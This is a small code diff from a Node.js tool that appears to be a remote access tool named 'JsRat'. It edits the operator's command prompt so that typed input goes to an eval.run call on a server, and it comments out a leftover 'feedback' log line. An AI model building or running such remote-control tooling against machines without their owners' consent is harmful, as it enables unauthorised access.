@@ -39,10 +39,10 @@ server.listen(conf.port, () => {
        });
        
        rl.question('JsRat>>> ', (answer) => {
-        // TODO: Log the answer in a database
-        console.log(`Thank you for your valuable feedback: ${answer}`);
+        //console.log(`Thank you for your valuable feedback: ${answer}`);
+        let ans = answer
         rl.close()
-        eval.run(answer, server)
+        eval.run(ans, server)
         
        });
 })
